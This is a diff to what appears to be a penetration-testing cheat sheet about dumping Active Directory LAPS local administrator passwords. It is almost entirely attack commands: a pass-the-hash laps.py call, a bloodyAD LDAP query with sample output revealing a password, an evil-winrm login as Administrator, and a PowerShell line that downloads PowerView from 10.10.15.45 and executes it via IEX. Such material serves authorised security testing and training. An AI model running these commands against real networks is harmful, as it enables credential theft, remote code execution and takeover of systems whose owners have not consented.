@@ -15,6 +15,31 @@ Pass the Hash, specific LDAP server:
 
 `$ python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local`
 
+### bloodyAD
+
+If BloodHound shows the user can read LAPS passwords, query `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime` directly:
+
+```bash
+bloodyAD --host DC_IP -d domain.local -u user -p 'PASSWORD' \
+  get search \
+  --filter '(ms-mcs-admpwdexpirationtime=*)' \
+  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+```
+
+Example output:
+
+```text
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=domain,DC=local
+ms-Mcs-AdmPwd: V,!31D;3&M+2h.
+ms-Mcs-AdmPwdExpirationTime: 134260119643091883
+```
+
+Use the recovered local Administrator password with WinRM if the target permits it:
+
+```bash
+evil-winrm -i DC_IP -u Administrator -p 'V,!31D;3&M+2h.'
+```
+
 ```
 (new-object system.net.webclient).downloadstring('http://10.10.15.45/PowerView.ps1') | IEX
 $SecPassword = ConvertTo-SecureString 'J5KCwKruINyCJBKd1dZU' -AsPlainText -Force
